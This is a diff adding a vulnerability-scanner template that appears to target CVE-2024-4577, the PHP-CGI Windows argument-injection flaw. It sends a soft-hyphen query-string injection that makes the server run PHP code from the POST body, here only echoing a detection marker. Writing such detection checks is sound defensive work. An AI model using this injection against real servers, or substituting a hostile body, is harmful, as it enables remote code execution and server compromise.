@@ -1,0 +1,30 @@
+id: php-cgi-arg-injection-rce
+info:
+  name: PHP-CGI Windows Argument Injection RCE (CVE-2024-4577)
+  author: phantomscan
+  severity: critical
+  description: Best-fit character encoding conversion in Windows allows bypass of CVE-2012-1823 protections, enabling arbitrary command line argument injection into the PHP CGI handler leading to remote code execution.
+  tags: cve,rce,php,cgi,critical
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
+  metadata:
+    cve-id: CVE-2024-4577
+    cvss-score: 9.8
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/?%ad-d+allow_url_include%3d1+%ad-d+auto_prepend_file%3dphp://input"
+      - "{{BaseURL}}/index.php?%ad-d+allow_url_include%3d1+%ad-d+auto_prepend_file%3dphp://input"
+      - "{{BaseURL}}/php-cgi/php-cgi.exe?%ad-d+allow_url_include%3d1+%ad-d+auto_prepend_file%3dphp://input"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "<?php echo 'php_cgi_cve_2024_4577_confirmed'; die(); ?>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "php_cgi_cve_2024_4577_confirmed"
+        part: body
